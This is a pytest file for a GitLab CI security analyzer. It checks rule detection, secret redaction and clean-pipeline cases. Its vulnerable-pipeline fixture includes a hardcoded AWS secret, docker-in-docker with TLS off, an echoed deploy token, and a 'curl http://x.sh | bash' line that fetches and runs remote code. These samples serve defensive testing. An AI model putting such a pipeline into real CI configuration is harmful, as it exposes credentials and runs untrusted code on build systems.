"""Tests for the GitLab CI analyzer."""

from __future__ import annotations

from scanners.cicd.gitlab_ci import analyze_gitlab_ci


def _ids(text: str) -> set[str]:
    return {f.rule_id for f in analyze_gitlab_ci(".gitlab-ci.yml", text)}


def _findings(text: str):
    return analyze_gitlab_ci(".gitlab-ci.yml", text)


VULNERABLE = """\
variables:
  AWS_SECRET_ACCESS_KEY: "literalsecretvalue"
  DOCKER_TLS_CERTDIR: ""

deploy_prod:
  stage: deploy
  services:
    - docker:dind
  environment:
    name: production
  script:
    - echo $DEPLOY_TOKEN
    - curl http://x.sh | bash
  artifacts:
    paths:
      - .
"""


def test_vulnerable_pipeline_rules() -> None:
    ids = _ids(VULNERABLE)
    for expected in {
        "GLC001", "GLC002", "GLC003", "GLC004", "GLC005", "GLC006", "GLC008", "GLC009",
    }:
        assert expected in ids, f"missing {expected}: {sorted(ids)}"


def test_secret_is_redacted() -> None:
    secret = next(f for f in _findings(VULNERABLE) if f.rule_id == "GLC001")
    assert "literalsecretvalue" not in (secret.evidence or "")


def test_referenced_variable_is_not_a_secret() -> None:
    text = 'variables:\n  DB_PASSWORD: "$CI_DB_PASSWORD"\n\nbuild:\n  script:\n    - make\n'
    assert "GLC001" not in _ids(text)


def test_dind_detected() -> None:
    text = "build:\n  services:\n    - docker:24-dind\n  script:\n    - docker build .\n"
    assert "GLC002" in _ids(text)


def test_clean_pipeline_has_no_findings() -> None:
    text = """\
build:
  stage: build
  image: python:3.11
  script:
    - make build
  artifacts:
    paths:
      - dist/app
    expire_in: 1 week
"""
    assert analyze_gitlab_ci(".gitlab-ci.yml", text) == []


def test_invalid_yaml() -> None:
    findings = analyze_gitlab_ci(".gitlab-ci.yml", "build:\n  script: [unclosed\n")
    assert findings and findings[0].rule_id == "GLC000"
